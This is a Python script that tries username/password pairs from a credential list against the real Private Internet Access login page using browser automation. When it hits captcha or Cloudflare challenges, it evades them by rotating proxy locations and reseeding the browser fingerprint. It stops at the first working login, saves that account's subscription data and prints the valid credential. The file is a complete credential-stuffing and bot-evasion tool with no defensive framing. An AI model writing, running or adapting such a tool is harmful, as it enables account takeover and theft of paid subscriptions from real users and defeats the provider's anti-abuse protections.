#!/usr/bin/env python3
"""
Try PIA credentials from a word list until one logs in and returns
subscription info. On bot detection it rotates the profile's proxy
location and reseeds its fingerprint.

File format: whitespace-separated username password, one per line.

Usage:
    python scripts/find_valid_pia_cred.py <credential-file> [profile]

Examples:
    python scripts/find_valid_pia_cred.py pia-creds.txt
    python scripts/find_valid_pia_cred.py pia-creds.txt proxy-rotating
"""
from __future__ import annotations

import argparse
import json
import subprocess
import sys
import time
from pathlib import Path

LOGIN_URL = "https://www.privateinternetaccess.com/account/client-sign-in"
OVERVIEW_API = "/api/client-control-panel/subscription-overview?coupon=official-site"

BOT_TITLES = ("just a moment", "checking your browser", "access denied", "attention required",
              "captcha", "robot", "are you human", "security check", "blocked")
BOT_URL_SNIPPETS = ("cloudflare", "captcha", "challenge", "bot", "ddos")
BOT_BODY_SNIPPETS = ("captcha", "robot", "denied", "blocked", "checking your browser",
                     "please wait", "security check")


def run_bdg(args: list[str], *, json_output: bool = False, check: bool = True) -> dict | str:
    cmd = ["bdg", *args]
    if json_output:
        cmd.append("--json")
    result = subprocess.run(cmd, capture_output=True, text=True, check=check)
    if json_output:
        return json.loads(result.stdout)
    return result.stdout


def fetch_proxy_locations() -> list[str]:
    """Ask CBM which proxy locations are available."""
    try:
        data = run_bdg(["cloak", "proxy-credentials"], json_output=True)
        records = data.get("data", [])
        locs = sorted({r["provider_location"] for r in records if "provider_location" in r})
        return locs
    except Exception as exc:
        print(f"Could not fetch proxy locations: {exc}", file=sys.stderr)
        return []


def stop_existing_session() -> None:
    subprocess.run(["bdg", "stop"], capture_output=True, text=True)
    subprocess.run(["bdg", "cleanup", "--force"], capture_output=True, text=True)


def start_session(profile: str) -> None:
    run_bdg(["cloak", "connect", profile, "about:blank"], check=True)
    time.sleep(5)


def rotate_profile(profile: str, location: str) -> None:
    """Set a new proxy location, reseed fingerprint, and relaunch the profile."""
    print(f"Switching profile '{profile}' to proxy location '{location}'...")
    run_bdg(["cloak", "profile", "proxy", profile, "--location", location], check=True)

    print(f"Reseeding fingerprint for profile '{profile}'...")
    run_bdg(["cloak", "profile", "reseed", profile], check=True)

    print(f"Stopping profile '{profile}'...")
    run_bdg(["cloak", "stop", profile], check=False)
    time.sleep(2)

    print(f"Relaunching profile '{profile}'...")
    run_bdg(["cloak", "launch", profile], check=True)

    print("Reconnecting bdg session after rotation...")
    subprocess.run(["bdg", "stop"], capture_output=True, text=True)
    run_bdg(["cloak", "connect", profile, "about:blank"], check=True)
    time.sleep(5)


def current_page_signals() -> dict:
    """Return current URL, title, and body text from the browser."""
    try:
        raw = run_bdg(
            ["cdp", "Runtime.evaluate", "--params", json.dumps({
                "expression": "({ url: window.location.href, title: document.title, text: document.body ? document.body.innerText.trim().slice(0, 500) : '' })",
                "awaitPromise": False,
                "returnByValue": True,
            })],
            json_output=False,
            check=False,
        )
        return json.loads(raw)["data"]["result"]["result"]["value"]
    except Exception:
        return {"url": "", "title": "", "text": ""}


def is_bot_detected(signals: dict | None = None) -> tuple[bool, str]:
    """Detect common anti-bot / challenge pages."""
    if signals is None:
        signals = current_page_signals()
    url = signals.get("url", "").lower()
    title = signals.get("title", "").lower()
    text = signals.get("text", "").lower()

    if any(snippet in url for snippet in BOT_URL_SNIPPETS):
        return True, f"URL touched bot challenge: {url[:120]}"
    if any(t in title for t in BOT_TITLES):
        return True, f"Title suspicious: {title[:120]}"
    if any(snippet in text for snippet in BOT_BODY_SNIPPETS):
        return True, f"Page body contains bot/captcha markers"
    return False, ""


def wait_for_element(selector: str, *, timeout: float = 20.0, poll: float = 0.5) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = run_bdg(["dom", "query", selector], json_output=True)
            count = data.get("data", {}).get("count", 0)
            if count and count > 0:
                return True
        except Exception:
            pass
        time.sleep(poll)
    return False


def reset_login_page() -> bool:
    """Clear session data, navigate to the PIA login page, and wait for the form."""
    run_bdg(["cdp", "Network.clearBrowserCookies"], check=False)
    clear_storage = """
(() => {
  try { localStorage.clear(); } catch (e) {}
  try { sessionStorage.clear(); } catch (e) {}
  return 'cleared';
})()
"""
    run_bdg(["cdp", "Runtime.evaluate", "--params", json.dumps({"expression": clear_storage, "awaitPromise": False, "returnByValue": True})], check=False)
    run_bdg(["cdp", "Page.navigate", "--params", json.dumps({"url": LOGIN_URL})], check=True)
    return wait_for_element("input.username", timeout=20)


def fill_field(selector: str, value: str) -> None:
    """Fill a React/controlled form field using the native setter."""
    expr = f"""
(() => {{
  const el = document.querySelector({json.dumps(selector)});
  if (!el) throw new Error('Element not found: ' + {json.dumps(selector)});
  const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
  el.focus();
  setter.call(el, {json.dumps(value)});
  el.dispatchEvent(new Event('input', {{ bubbles: true }}));
  el.dispatchEvent(new Event('change', {{ bubbles: true }}));
  el.blur();
  return el.value;
}})()
"""
    raw = run_bdg(
        ["cdp", "Runtime.evaluate", "--params", json.dumps({"expression": expr, "awaitPromise": False, "returnByValue": True})],
        json_output=False,
        check=True,
    )
    actual = json.loads(raw)["data"]["result"]["result"]["value"]
    if actual != value:
        raise RuntimeError(f"Field {selector} did not accept value (got: {actual})")


def fetch_overview(expected_username: str) -> dict | None:
    """Fetch the PIA subscription overview and confirm it belongs to expected_username."""
    fetch_expr = f"""
fetch({json.dumps(OVERVIEW_API)}, {{
  credentials: 'include',
  headers: {{ 'Accept': 'application/json' }}
}}).then(r => r.text())
"""
    try:
        raw = run_bdg(
            ["cdp", "Runtime.evaluate", "--params", json.dumps({"expression": fetch_expr, "awaitPromise": True, "timeout": 30000})],
            json_output=False,
            check=False,
        )
        text = json.loads(raw)["data"]["result"]["result"]["value"]
        data = json.loads(text)
        if isinstance(data, dict) and ("subscription" in data or "subscriptionData" in data) and data.get("username") == expected_username:
            return data
    except Exception:
        pass
    return None


class CredentialResult:
    SUCCESS = "success"
    INVALID = "invalid"
    BOT = "bot"


def try_credential(username: str, password: str) -> tuple[str, dict | None]:
    """Attempt one credential. Returns (status, data|None)."""
    if not reset_login_page():
        bot, reason = is_bot_detected()
        if bot:
            return CredentialResult.BOT, {"reason": reason}
        return CredentialResult.INVALID, None

    fill_field("input.username", username)
    fill_field("input.password", password)
    run_bdg(["dom", "click", "button.green_btn.submit"], check=True)
    time.sleep(5)

    bot, reason = is_bot_detected()
    if bot:
        return CredentialResult.BOT, {"reason": reason}

    data = fetch_overview(username)
    if data:
        return CredentialResult.SUCCESS, data

    return CredentialResult.INVALID, None


def load_credentials(path: Path) -> list[tuple[str, str]]:
    creds = []
    raw = path.read_text(encoding="utf-8", errors="ignore")
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split(maxsplit=1)
        if len(parts) != 2:
            continue
        creds.append((parts[0], parts[1]))
    return creds


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Find a valid PIA credential; rotates CBM proxy location and fingerprint on bot detection"
    )
    parser.add_argument("file", type=Path, help="Credential file (username password per line)")
    parser.add_argument("profile", nargs="?", default="proxy-rotating", help="CBM profile to use (default: proxy-rotating)")
    parser.add_argument("--limit", type=int, default=0, help="Maximum attempts (0 = all)")
    parser.add_argument("--max-rotations", type=int, default=20, help="Max proxy-location/fingerprint rotations before giving up")
    parser.add_argument("--locations", default="", help="Comma-separated proxy locations to rotate through (default: fetch from CBM)")
    args = parser.parse_args()

    if not args.file.exists():
        print(f"File not found: {args.file}", file=sys.stderr)
        return 1

    if args.locations:
        locations = [loc.strip() for loc in args.locations.split(",") if loc.strip()]
    else:
        locations = fetch_proxy_locations()

    if not locations:
        print("No proxy locations available. Pass --locations or configure proxy credentials in CBM.", file=sys.stderr)
        return 1

    creds = load_credentials(args.file)
    print(f"Loaded {len(creds)} credentials. Profile: {args.profile}. Available proxy locations: {locations}")

    stop_existing_session()
    location_idx = 0
    rotations_remaining = args.max_rotations
    start_session(args.profile)

    tried = 0
    for username, password in creds:
        tried += 1
        if args.limit and tried > args.limit:
            print(f"Reached --limit {args.limit}. Stopping.")
            break

        print(f"\n[{tried}] Trying {username} ...", flush=True)

        while True:
            try:
                status, info = try_credential(username, password)
            except RuntimeError as exc:
                print(f"    ERROR: {exc}")
                signals = current_page_signals()
                bot, reason = is_bot_detected(signals)
                if bot:
                    status, info = CredentialResult.BOT, {"reason": reason}
                else:
                    status = CredentialResult.INVALID
                    info = None

            if status == CredentialResult.SUCCESS:
                data = info
                out_path = Path(f"pia-subscription-overview-{username}.json")
                out_path.write_text(json.dumps(data, indent=2), encoding="utf-8")
                print(f">>> VALID CREDENTIAL FOUND: {username} / {password}")
                print(f"Subscription overview saved to: {out_path}")
                return 0

            if status == CredentialResult.INVALID:
                print("    Invalid credentials")
                break

            if status == CredentialResult.BOT:
                reason = info.get("reason", "unknown")
                print(f"    BOT DETECTED ({reason})")

                if rotations_remaining <= 0:
                    print("Exhausted proxy/fingerprint rotations; cannot bypass bot detection.")
                    return 1

                rotations_remaining -= 1
                current_location = locations[location_idx % len(locations)]
                location_idx += 1
                print(f"    Rotating proxy/fingerprint ({rotations_remaining} rotations left) -> {current_location}")
                try:
                    rotate_profile(args.profile, current_location)
                except subprocess.CalledProcessError as exc:
                    print(f"    Could not rotate profile: {exc.stderr or exc.stdout}", file=sys.stderr)
                    return 1
                continue

    print("\nNo valid credential found.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
